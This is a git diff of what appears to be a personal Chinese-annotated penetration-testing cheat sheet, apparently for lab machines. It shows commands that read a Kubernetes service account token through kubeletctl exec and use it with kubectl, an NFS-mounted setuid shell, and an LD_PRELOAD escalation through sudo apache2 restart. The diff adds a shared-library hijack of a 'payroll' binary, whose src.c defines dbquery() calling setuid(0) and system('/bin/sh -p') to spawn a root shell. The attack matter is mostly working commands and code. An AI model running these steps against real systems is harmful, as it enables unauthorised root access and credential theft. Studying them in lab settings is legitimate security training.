@@ -156,7 +156,7 @@ kubeletctl --server 10.129.10.11 exec "cat /var/run/secrets/kubernetes.io/servic
 export token=`cat k8.token`
 kubectl --token=$token --certificate-authority=ca.crt --server=https://10.129.10.11:6443 auth can-i --list                                  列出 权限
 
-  privesc.yaml 文件
+  privesc.yaml 内容
   ————————————
   apiVersion: v1
   kind: Pod
@@ -194,7 +194,7 @@ kali:~$ nc -nlvp 9001
 showmount -e 10.129.2.12                        查看可用 NFS
 sudo mount -t nfs 10.129.2.12:/tmp /mnt         挂载 NFS
 gcc shell.c -o shell
-  shell.c的内容
+  shell.c 内容
   ————————————
   #include <stdio.h>
   #include <sys/types.h>
@@ -219,14 +219,14 @@ uname -a                  查看内核信息
 cat /etc/lsb-release      查发行版本
 
 
-ldd /bin/ls            查看 ls 所需动态库
+ldd /bin/ls            查看 ls 依赖动态库
 利用 LD_PRELOAD 环境变量进行提权：
   https://web.archive.org/web/20231214050750/https://blog.fpmurphy.com/2012/09/all-about-ld_preload.html
 
 sudo -l
   (root) NOPASSWD: /usr/sbin/apache2 restart
 gcc -fPIC -shared -o root.so root.c -nostartfiles            把 root.c 编译成 root.so
-  root.c的内容
+  root.c 内容
   ————————————
   #include <stdio.h>
   #include <sys/types.h>
@@ -241,3 +241,25 @@ gcc -fPIC -shared -o root.so root.c -nostartfiles            把 root.c 编译�
   }
   ————————————
 sudo LD_PRELOAD=/tmp/root.so /usr/sbin/apache2 restart            获得 root shell
+
+
+
+readelf -d payroll  | grep PATH                                   查看库路径  /development
+ldd payroll                                                       查看 payroll 依赖动态库 libshared.so
+cp /lib/x86_64-linux-gnu/libc.so.6 /development/libshared.so      用空文件覆盖 /development/libshared.so
+./payroll                                                         查看所需函数 是 dbquery()
+gcc src.c -fPIC -shared -o /development/libshared.so              编译恶意函数，覆盖 /development/libshared.so
+
+  src.c 内容
+  ————————————
+  #include<stdio.h>
+  #include<stdlib.h>
+  #include<unistd.h>
+  
+  void dbquery() {
+      printf("Malicious library loaded\n");
+      setuid(0);
+      system("/bin/sh -p");
+  } 
+  ————————————
+./payroll         获得 root shell
